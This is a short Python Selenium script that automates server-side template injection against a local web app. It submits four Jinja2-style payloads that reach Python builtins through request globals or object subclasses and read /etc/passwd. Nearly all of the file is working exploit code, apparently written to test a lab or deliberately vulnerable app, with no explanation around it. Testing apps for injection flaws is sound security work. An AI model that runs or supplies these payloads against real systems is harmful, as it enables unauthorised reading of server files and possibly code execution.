from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
import time

service = ChromeService(executable_path=ChromeDriverManager().install())
driver = webdriver.Chrome(service=service)

try:
    driver.get("http://localhost:5000")

    #0
    input_field = driver.find_element(By.ID, "input")
    input_field.send_keys("{{request.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}} ")
    submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
    submit_button.click()
    print("test0")
    time.sleep(2)
    driver.refresh()
    time.sleep(1)

    #1
    input_field = driver.find_element(By.ID, "input")
    input_field.send_keys("{{request.application.__globals__['__builtins__'].open('/etc/passwd').read()}}")
    submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
    submit_button.click()
    print("test1")
    time.sleep(2)
    driver.refresh()
    time.sleep(1)

    #2
    input_field = driver.find_element(By.ID, "input")
    input_field.send_keys("{{().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()}} ")
    submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
    submit_button.click()
    print("test2")
    time.sleep(2)
    driver.refresh()
    time.sleep(1)

    #3
    input_field = driver.find_element(By.ID, "input")
    input_field.send_keys("{{().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()}}")
    submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
    submit_button.click()
    print("test4")
    time.sleep(3)

finally:
    # Close the browser
    driver.quit()
